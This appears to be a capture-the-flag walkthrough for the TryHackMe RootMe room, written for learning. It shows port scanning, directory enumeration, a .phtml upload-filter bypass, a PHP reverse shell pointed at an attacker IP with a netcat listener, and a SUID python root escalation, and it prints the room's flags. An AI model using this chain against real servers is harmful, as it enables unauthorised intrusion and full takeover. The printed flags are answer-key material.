# TryHackMe RootMe - Complete Walkthrough

![TryHackMe](https://img.shields.io/badge/TryHackMe-RootMe-red?style=for-the-badge&logo=tryhackme)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
![Category](https://img.shields.io/badge/Category-Web%20Exploitation-blue?style=for-the-badge)

## 📋 Table of Contents
- [Overview](#overview)
- [Task 1: Deploy the Machine](#task-1-deploy-the-machine)
- [Task 2: Reconnaissance](#task-2-reconnaissance)
- [Task 3: Getting a Shell](#task-3-getting-a-shell)
- [Task 4: Privilege Escalation](#task-4-privilege-escalation)
- [Flags](#flags)
- [Key Learnings](#key-learnings)
- [Tools Used](#tools-used)

## 🎯 Overview
RootMe is a beginner-friendly CTF focusing on:
- Basic reconnaissance and port scanning
- Web directory enumeration
- File upload bypass techniques
- PHP reverse shell deployment
- SUID binary privilege escalation

## 🚀 Task 1: Deploy the Machine

### 📡 Setup Instructions
1. **Connect to TryHackMe network** via OpenVPN
2. **Deploy the virtual machine** and note the IP address
3. **Create working directory** for organization:
```bash
mkdir rootme
cd rootme
mkdir nmap
```

## 🔍 Task 2: Reconnaissance

### 🌐 Port Scanning
```bash
nmap -sC -sV -oN nmap/rootme <TARGET_IP>
```

### 📊 Scan Results
**Q1: How many ports are open?**  
**Answer:** `2`

**🎯 Open Ports:**
- **22/tcp** - SSH OpenSSH 7.6p1
- **80/tcp** - HTTP Apache httpd 2.4.29

**Q2: What version of Apache is running?**  
**Answer:** `2.4.29`

**Q3: What service is running on port 22?**  
**Answer:** `ssh`

### 🕸️ Directory Enumeration
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster_results.txt -q
```

**Q4: Find directories on the web server using GoBuster**

**Q5: What is the hidden directory?**  
**Answer:** `/panel/`

## 🐚 Task 3: Getting a Shell

### 🔍 Web Application Analysis
1. **Navigate to** `http://<TARGET_IP>`
2. **Inspect source code** (Ctrl+U) for valuable information
3. **Explore discovered directory** `/panel/`

### 📤 File Upload Discovery
**🎯 Key Finding:** File upload functionality at `/panel/`

### 🔄 PHP Reverse Shell Setup

#### 📥 Download Reverse Shell
```bash
# Clone pentestmonkey's PHP reverse shell
git clone https://github.com/pentestmonkey/php-reverse-shell
```

#### ⚙️ Configure the Shell
```bash
# Edit the script
nano php-reverse-shell.php

# Modify these variables:
$ip = 'YOUR_ATTACKER_IP';
$port = 1234;  # Your listening port
```

### 🚫 Upload Bypass Technique
**❌ Initial upload fails** - `.php` extension blocked

**✅ Bypass method:**
```bash
# Rename file to bypass filter
mv php-reverse-shell.php php-reverse-shell.phtml
```

**🎯 Alternative extensions to try:**
- `.phtml`
- `.php3`
- `.php4`
- `.php5`
- `.phar`

### 🎧 Netcat Listener Setup
```bash
# Start listener on chosen port
nc -lvnp 1234
```

### 🚀 Shell Execution
1. **Upload the modified script** via `/panel/`
2. **Navigate to uploads directory** `http://<TARGET_IP>/uploads/`
3. **Execute the script** by clicking on `php-reverse-shell.phtml`
4. **Check netcat listener** for connection

### 🏆 User Flag Discovery
```bash
# Search for user flag
find / -type f -name user.txt 2>/dev/null

# Found location: /var/www/user.txt
cat /var/www/user.txt
```

**🚩 User Flag:** `THM{y0u_g0t_a_sh3ll}`

## 🚀 Task 4: Privilege Escalation

### 🔍 SUID Binary Discovery
**Q1: Search for files with SUID permission, which file is weird?**  
**Answer:** `/usr/bin/python`

```bash
# Find SUID binaries
find / -type f -user root -perm -4000 2>/dev/null
```

**🎯 Interesting Finding:** `/usr/bin/python` with SUID permissions

### 🌐 GTFOBins Research
1. **Visit** [https://gtfobins.github.io/](https://gtfobins.github.io/)
2. **Search for** "python"
3. **Select** "SUID" section

### 💥 Privilege Escalation Exploit
```bash
# Execute the GTFOBins python SUID exploit
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Verify root access
whoami
# Expected output: root
```

### 👑 Root Flag Discovery
```bash
# Find root flag
find / -type f -name root.txt 2>/dev/null

# Found location: /root/root.txt
cat /root/root.txt
```

**🚩 Root Flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

## 🏆 Flags
- **👤 User Flag:** `THM{y0u_g0t_a_sh3ll}`
- **👑 Root Flag:** `THM{pr1v1l3g3_3sc4l4t10n}`

## 📚 Key Learnings

### 🕸️ Web Application Security
- **File upload vulnerabilities** are common attack vectors
- **Extension filtering** can often be bypassed with alternative extensions
- **Always test multiple file extensions** when uploads are restricted

### 🔄 Reverse Shell Techniques
- **Pentestmonkey's PHP reverse shell** is a reliable payload
- **Always modify IP and port** before deployment
- **Alternative extensions** (.phtml, .php3, etc.) bypass basic filters

### 🔍 Enumeration Best Practices
- **Directory enumeration** reveals hidden functionality
- **Source code inspection** can provide valuable clues
- **Systematic approach** to reconnaissance pays off

### 🚀 Privilege Escalation
- **SUID binaries** are prime targets for privilege escalation
- **GTFOBins** is an invaluable resource for exploitation techniques
- **Python with SUID** allows direct privilege escalation

### 🎯 Attack Chain Analysis
```
1. Port Scan → Services Discovery
2. Web Enum → /panel/ directory
3. File Upload → Bypass with .phtml
4. Reverse Shell → Initial access
5. SUID Discovery → /usr/bin/python
6. GTFOBins → Privilege escalation
7. Root Access → Complete compromise
```

## 🛠️ Tools Used
- `nmap` - Port scanning and service enumeration
- `gobuster` - Directory and file discovery
- `netcat` - Reverse shell listener
- `find` - File and flag discovery
- **Pentestmonkey PHP Reverse Shell** - Payload delivery
- **GTFOBins** - Privilege escalation research

## 🎯 Upload Bypass Techniques
| Extension | Success Rate | Notes |
|-----------|--------------|-------|
| `.php` | ❌ | Commonly blocked |
| `.phtml` | ✅ | Often overlooked |
| `.php3` | ✅ | Legacy PHP extension |
| `.php4` | ✅ | Legacy PHP extension |
| `.php5` | ✅ | Legacy PHP extension |
| `.phar` | ✅ | PHP Archive format |

## 🔍 SUID Binary Exploitation
```bash
# Common SUID binaries to check:
/usr/bin/python
/usr/bin/python3
/bin/bash
/usr/bin/vim
/usr/bin/nano
/usr/bin/find
/usr/bin/awk
```

---

> **💡 Pro Tip:** Always check GTFOBins when you find unusual SUID binaries. Many legitimate tools can be abused for privilege escalation when they have SUID permissions.

**Author:** Your Security Notes  
**Date:** Created for TryHackMe RootMe Room  
**Difficulty:** Easy  
**Tags:** `#tryhackme` `#webexploitation` `#fileupload` `#php` `#suid` `#privesc`
